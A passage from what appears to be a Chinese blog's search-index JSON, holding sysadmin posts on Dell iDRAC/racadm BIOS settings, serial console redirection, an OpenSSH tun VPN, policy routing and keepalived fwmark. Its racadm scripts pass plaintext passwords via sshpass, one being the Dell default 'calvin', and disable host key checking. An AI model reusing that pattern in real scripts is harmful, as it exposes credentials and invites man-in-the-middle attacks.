\u0026gt; Virtualization Technology\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240115165609882\" loading=\"lazy\" src=\"/posts/20240115-kvm_sriov/image-20240115165609882.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSystem BIOS \u0026gt; Integrated Devices \u0026gt; SR-IOV Global Enable \u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240115165640371\" loading=\"lazy\" src=\"/posts/20240115-kvm_sriov/image-20240115165640371.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当然，这么麻烦的事情，我们直接用脚本通过idrac调用racadm来做好了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e BIOS.ProcSettings.ProcVirtualization Enabled  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;calvin\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e BIOS.IntegratedDevices.SriovGlobalEnable Enabled  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm serveraction powercycle  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，Dell R730的机器用得是Intel I350的以太网卡，每个网口最多支持8个VF，如果是高级的X520网卡，就支持64个VF。\u003c/p\u003e","title":"kvm提高网卡效率使用SR-IOV"},{"content":"Linux的环境了，windows的不行。\nDell的idrac其实提供了远程的ssh界面，我们通常用idrac来设置bios什么的，当然如果能通过idrac直接登录服务器那就更好了。\n首先普及以下几个概念：\ntty: Video console terminal (abbreviation for “Teletype”) ttyS: Serial console terminal pts: Virtual console terminal (pseudo-tty or pty but stands for Pseudo-Terminal Slave (PTS)) 简单说，tty是带显示器的终端，ttyS是串口终端，pts是虚拟终端。tty接显示器、键盘，ttyS接串口，pst就是远程ssh/telnet过来的虚拟终端。\n第一步：修改Dell Bios\ndell的bios中关于serial的配置如下图： 我们只改前两个就可以了：\nSerial Communication: “On with serial redirection via com2” Serial Port Address: “Serial Device1 = COM1, Serial Device2=COM2 External Serial Connector: “Serial Device1” Failsafe Baud Rate: “115200” Remote Terminal Type: “VT100/VT220” Redirection After Boot: “Enabled” 解释一下：\nSerial Communication 缺省是 On without Console Redirection，我们需要把所有console的显示都转发到com2上，所以需要改。 Serial Port Address 缺省是 Serial Device 1=COM2, Serial Device 2=COM1，如果不改，那么接上物理机上的串口就可以看到登录画面了，这样等于串口1废掉了，万一我们要把物理机上的com1口给留出来备用，插个串口的wavecom modem做报警用，那就傻眼了，所以必须改掉留出com1备用。 External Serial Connector 缺省是 Serial Device1，不用改，那么物理机上的com口就是com1了，对应ttyS0。 Failsafe Baud Rate: “115200”，不用改，就用这个高的好了。 Remote Terminal Type: “VT100/VT220”，不用改，黑白的vt100就很好 Redirection After Boot: “Enabled”，也不用改，需要重定向。 当然，用脚本一次搞定更好：\n#!/bin/sh sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.SerialCommSettings.SerialPortAddress \u0026#34;Serial1Com1Serial2Com2\u0026#34; sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.SerialCommSettings.SerialComm \u0026#34;OnConRedirCom2\u0026#34; sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW -e TIME_NA 第二步：编辑linux\n编辑/etc/grub.conf 加上以下两行，并且注释掉splashimage，注意speed是57600，不是115200\nserial –unit=1 –speed=57600 terminal –timeout=10 serial #splashimage=(hd0,0)/grub/splash.xpm.gz 在kenel一行最后加上\nconsole=tty1 console=ttyS1,115200n8r 给个完成版本：\ndefault=0 timeout=5 #splashimage=(hd0,0)/grub/splash.xpm.gz serial -unit=1 -speed=57600 terminal -timeout=10 serial hiddenmenu title CentOS 6 (2.6.32-504.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-504.el6.x86_64 ro root=UUID=16154774-dbaf-4fcb-aedb-0513cb65a0eb rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet intel_iommu=on console=tty1 console=ttyS1,115200n8r initrd /initramfs-2.6.32-504.el6.x86_64.img 修改/etc/securetty，加上ttyS1\ncat /etc/securetty console vc/1 vc/2 vc/3 vc/4 vc/5 vc/6 vc/7 vc/8 vc/9 vc/10 vc/11 tty1 tty2 tty3 tty4 tty5 tty6 tty7 tty8 tty9 tty10 tty11 ttyS1 编辑 vi /etc/inittab，加一行\nco:2345:respawn:/sbin/agetty ttyS1 115200 vt100-nav\ncat /etc/inittab id:3:initdefault: co:2345:respawn:/sbin/agetty ttyS1 115200 vt100-nav 然后重启服务器，登录idrac , console com2就可以直接登录服务器了：\nssh 10.8.1.2 root@10.16.1.2\u0026#39;s password: /admin1-\u0026gt; console com2 Connected to Serial Device 2. To end type: ^\\ ","permalink":"https://rendoumi.com/posts/20240115-idrac_monitor/","summary":"\u003cp\u003eLinux的环境了，windows的不行。\u003c/p\u003e\n\u003cp\u003eDell的idrac其实提供了远程的ssh界面，我们通常用idrac来设置bios什么的，当然如果能通过idrac直接登录服务器那就更好了。\u003c/p\u003e\n\u003cp\u003e首先普及以下几个概念：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003etty: Video console terminal (abbreviation for “Teletype”)\u003c/li\u003e\n\u003cli\u003ettyS: Serial console terminal\u003c/li\u003e\n\u003cli\u003epts: Virtual console terminal (pseudo-tty or pty but stands for Pseudo-Terminal Slave (PTS))\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e简单说，tty是带显示器的终端，ttyS是串口终端，pts是虚拟终端。tty接显示器、键盘，ttyS接串口，pst就是远程ssh/telnet过来的虚拟终端。\u003c/p\u003e\n\u003cp\u003e第一步：修改Dell Bios\u003c/p\u003e\n\u003cp\u003edell的bios中关于serial的配置如下图：\n\u003cimg alt=\"image-20240115164915483\" loading=\"lazy\" src=\"/posts/20240115-idrac_monitor/image-20240115164915483.png\"\u003e 我们只改前两个就可以了：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSerial Communication: “On with serial redirection via com2”\u003c/li\u003e\n\u003cli\u003eSerial Port Address: “Serial Device1 = COM1, Serial Device2=COM2\u003c/li\u003e\n\u003cli\u003eExternal Serial Connector: “Serial Device1”\u003c/li\u003e\n\u003cli\u003eFailsafe Baud Rate: “115200”\u003c/li\u003e\n\u003cli\u003eRemote Terminal Type: “VT100/VT220”\u003c/li\u003e\n\u003cli\u003eRedirection After Boot: “Enabled”\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e解释一下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSerial Communication 缺省是 On without Console Redirection，我们需要把所有console的显示都转发到com2上，所以需要改。\u003c/li\u003e\n\u003cli\u003eSerial Port Address 缺省是 Serial Device 1=COM2, Serial Device  2=COM1，如果不改，那么接上物理机上的串口就可以看到登录画面了，这样等于串口1废掉了，万一我们要把物理机上的com1口给留出来备用，插个串口的wavecom modem做报警用，那就傻眼了，所以必须改掉留出com1备用。\u003c/li\u003e\n\u003cli\u003eExternal Serial Connector 缺省是 Serial Device1，不用改，那么物理机上的com口就是com1了，对应ttyS0。\u003c/li\u003e\n\u003cli\u003eFailsafe Baud Rate: “115200”，不用改，就用这个高的好了。\u003c/li\u003e\n\u003cli\u003eRemote Terminal Type: “VT100/VT220”，不用改，黑白的vt100就很好\u003c/li\u003e\n\u003cli\u003eRedirection After Boot: “Enabled”，也不用改，需要重定向。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e当然，用脚本一次搞定更好：\u003c/p\u003e","title":"idrac远程登录服务器"},{"content":"openssh是支持隧道的，所以很简单就可以在ssh中再套个管道，直接用来vpn，场景如下：\n如上图，A机能ssh无密码登录B机\nA机的IP：172.16.8.106\nB机的IP：172.16.8.108\nA机拨通vpn tunnel后tun的ip：192.168.244.2\nB机拨通vpn tunnel后tun的ip：192.168.244.1\n首先编辑A和B的/etc/ssh/sshd_config，允许tunnel，缺省是不允许的，然后service sshd restart ，重启sshd ... PermitTunnel yes ... A和B安装linux下的tunctl软件，并启动一个tunnel设备 yum install tunctl tunctl -t tun5 -u root 在A(172.16.8.106)机器上生成key，并设置能无密码证书直接登录B(172.16.8.108) ssh-keygen ssh-copy-id root@172.16.8.108 在A上执行命令，建立ssh tunnel： ssh -w 5:5 root@172.168.8.108 在A上执行 ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0 在B上执行 ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0 这样分别在A和B上ping 192.168.244.1和192.168.244.2，都能通就表示已经ok了。 优化一下，A和B两边都先把tun5起来以后，直接在A上一句话搞定，这个不会自动退出，所以得ctrl+z，然后bg放后台去：\nssh \\ -o PermitLocalCommand=yes \\ -o LocalCommand=\u0026#34;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0\u0026#34; \\ -o ServerAliveInterval=60 \\ -w 5:5 root@172.16.8.108 \\ \u0026#39;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0; echo tun5 ready\u0026#39; 如果要用在翻墙的环境，那就得保持长链接了。假设A机器是在一个防火墙后，且被NAT了，那么就得先这样打通隧道：\nssh -f -w5:5 vpn@example.com \\ -o ServerAliveInterval=30 \\ -o ServerAliveCountMax=5 \\ -o TCPKeepAlive=yes \\ -i ~/.ssh/id_rsa \u0026#34;sleep 1000000000\u0026#34; 然后在A和B上分别单独配置ip即可。\n再进阶：假设A要建立独立的netns空间，加ip及网关如下：\nip net add ns-vpn ip net exec ip addr add 100.64.42.2/24 dev tun42 ip net exec ip link set up dev tun42 ip net exec ip route add default via 100.64.42.1 再在B的/etc/sysctl.conf打开转发\nnet.ipv4.ip_forward = 1 sysctl -p iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -j SNAT --to 172.16.8.108 A就可以通过B代理出去了。\n","permalink":"https://rendoumi.com/posts/20240115-ssh_tun_vpn/","summary":"\u003cp\u003eopenssh是支持隧道的，所以很简单就可以在ssh中再套个管道，直接用来vpn，场景如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240115164125796\" loading=\"lazy\" src=\"/posts/20240115-ssh_tun_vpn/image-20240115164125796.png\"\u003e\u003c/p\u003e\n\u003cp\u003e如上图，A机能ssh无密码登录B机\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA机的IP：172.16.8.106\u003c/p\u003e\n\u003cp\u003eB机的IP：172.16.8.108\u003c/p\u003e\n\u003cp\u003eA机拨通vpn tunnel后tun的ip：192.168.244.2\u003c/p\u003e\n\u003cp\u003eB机拨通vpn tunnel后tun的ip：192.168.244.1\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e首先编辑A和B的/etc/ssh/sshd_config，允许tunnel，缺省是不允许的，然后service sshd restart ，重启sshd\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePermitTunnel yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA和B安装linux下的tunctl软件，并启动一个tunnel设备\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install tunctl  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etunctl -t tun5 -u root  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在A(172.16.8.106)机器上生成key，并设置能无密码证书直接登录B(172.16.8.108)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-copy-id root@172.16.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在A上执行命令，建立ssh tunnel：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -w 5:5 root@172.168.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在A上执行\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在B上执行\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e这样分别在A和B上ping 192.168.244.1和192.168.244.2，都能通就表示已经ok了。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e优化一下，A和B两边都先把tun5起来以后，直接在A上一句话搞定，这个不会自动退出，所以得ctrl+z，然后bg放后台去：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -o \u003cspan class=\"nv\"\u003ePermitLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eServerAliveInterval\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -w 5:5 root@172.16.8.108 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0; echo tun5 ready\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果要用在翻墙的环境，那就得保持长链接了。假设A机器是在一个防火墙后，且被NAT了，那么就得先这样打通隧道：\u003c/p\u003e","title":"用openssh的tunnel建立vpn"},{"content":"场景：\n公司有两条线路，一条是鹏博士的，一条是电信的。 鹏博士是100兆共享线路，电信是10兆独享线路。 鹏博士对端的地址是1.1.1.1，本地服务器地址是1.1.1.2 电信对端的地址是2.2.2.2，本地服务器是2.2.2.3 所以导致有两个网关，大部分公司同事用得是100兆的共享，10兆的被客服独用，但是使用率很低。那能否两边都用呢？\n答案是可以的，用策略路由就可以。\n策略路由需要用到iproute2，没有的话先安装一下。\n定义策略路由表\ncd /etc/iproute2/ echo \u0026#34;101 pengboshi\u0026#34; \u0026gt;\u0026gt; rt_tables echo \u0026#34;102 dianxin\u0026#34; \u0026gt;\u0026gt; rt_tables 定义策略路由\nip route add default via 1.1.1.1 table 101 ip route add default via 2.2.2.2 table 102 ok，流量分为两个方向，进来的和出去的，先定义简单的，进来的：\nip rule add from 1.1.1.1 table 101 ip rule add from 2.2.2.2 table 102 出就比较麻烦了，100兆和10兆按权重来分，8：2吧\nip route replace default scope global \\ nexthop via 1.1.1.1 dev eth0 weight 8 \\ nexthop via 2.2.2.2 dev eth0:1 weight 2 注意，因为我们是用了一台路由器来连接上面两个网关的，服务器实际是一个网卡上连到交换机，然后再上连路由器的，如下图:\n我们把这一切固定下来，编辑/etc/rc.d/rc.local即可\n# cat /etc/rc.local #!/bin/sh touch /var/lock/subsys/local /sbin/ip route replace default scope global nexthop via 1.1.1.1 dev eth0 weight 8 nexthop via 2.2.2.2 dev eth0:1 weight 2 ","permalink":"https://rendoumi.com/posts/20240111-route_policy2/","summary":"\u003cp\u003e场景：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e公司有两条线路，一条是鹏博士的，一条是电信的。\u003c/li\u003e\n\u003cli\u003e鹏博士是100兆共享线路，电信是10兆独享线路。\u003c/li\u003e\n\u003cli\u003e鹏博士对端的地址是1.1.1.1，本地服务器地址是1.1.1.2\u003c/li\u003e\n\u003cli\u003e电信对端的地址是2.2.2.2，本地服务器是2.2.2.3\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e所以导致有两个网关，大部分公司同事用得是100兆的共享，10兆的被客服独用，但是使用率很低。那能否两边都用呢？\u003c/p\u003e\n\u003cp\u003e答案是可以的，用策略路由就可以。\u003c/p\u003e\n\u003cp\u003e策略路由需要用到\u003cstrong\u003eiproute2\u003c/strong\u003e，没有的话先安装一下。\u003c/p\u003e\n\u003cp\u003e定义策略路由表\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /etc/iproute2/  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;101 pengboshi\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; rt_tables  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;102 dianxin\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; rt_tables  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e定义策略路由\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route add default via 1.1.1.1 table \u003cspan class=\"m\"\u003e101\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route add default via 2.2.2.2 table \u003cspan class=\"m\"\u003e102\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，流量分为两个方向，进来的和出去的，先定义简单的，进来的：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip rule add from 1.1.1.1 table \u003cspan class=\"m\"\u003e101\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip rule add from 2.2.2.2 table \u003cspan class=\"m\"\u003e102\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e出就比较麻烦了，100兆和10兆按权重来分，8：2吧\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route replace default scope global \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enexthop via 1.1.1.1 dev eth0 weight \u003cspan class=\"m\"\u003e8\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enexthop via 2.2.2.2 dev eth0:1 weight \u003cspan class=\"m\"\u003e2\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，因为我们是用了一台路由器来连接上面两个网关的，服务器实际是一个网卡上连到交换机，然后再上连路由器的，如下图:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20240111-route_policy2/image-20240111164124457.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们把这一切固定下来，编辑/etc/rc.d/rc.local即可\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# cat /etc/rc.local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etouch /var/lock/subsys/local  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/sbin/ip route replace default scope global nexthop via 1.1.1.1 dev eth0 weight \u003cspan class=\"m\"\u003e8\u003c/span\u003e nexthop via 2.2.2.2 dev eth0:1 weight \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"多网关、策略路由、负载均衡的实际应用"},{"content":"Iptable可以给进来的包打上标签，比如我们把从1.2.3.4进来的包都打上标签2000（标签可以是任何整数）\niptables -t mangle -A PREROUTING -i eth0 \\ -p tcp -s 1.2.3.4 --dport http -j MARK --set-mark 2000 或者把访问172.16.8.1的80和443端口的包都打上标签123：\niptables -t mangle -A PREROUTING -i eth0 \\ -p tcp -d 172.16.8.1/32 -m multiport --dports 80,443 -j MARK --set-mark 123 随后我们就可以在keepalived里来指定virtual_server来处理这些打过标签的流量了：\nvirtual_server fwmark 123 { ... } 具体的一个用法，如果你想禁止从1.2.3.4来的ip访问你服务器，于是乎你就可以先给包打上标签2000，然后配个服务器，上面写联系人和电话，单独给他看，他看到会联系你询问被屏蔽的原因，如下：\nvirtual_server fwmark 2000 { delay_loop 6 lb_algo wlc lb_kind NAT persistence_timeout 0 protocol TCP real_server 10.10.10.1 80 { weight 1 TCP_CHECK { connect_port 80 connect_timeout 3 } } } ","permalink":"https://rendoumi.com/posts/20240111-keepalived_iptable_mark/","summary":"\u003cp\u003eIptable可以给进来的包打上标签，比如我们把从1.2.3.4进来的包都打上标签2000（标签可以是任何整数）\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t mangle -A PREROUTING -i eth0 \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-p tcp -s 1.2.3.4 --dport http -j MARK --set-mark \u003cspan class=\"m\"\u003e2000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e或者把访问172.16.8.1的80和443端口的包都打上标签123：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t mangle -A PREROUTING -i eth0 \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-p tcp -d 172.16.8.1/32 -m multiport --dports 80,443 -j MARK --set-mark \u003cspan class=\"m\"\u003e123\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e随后我们就可以在keepalived里来指定virtual_server来处理这些打过标签的流量了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirtual_server fwmark \u003cspan class=\"m\"\u003e123\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 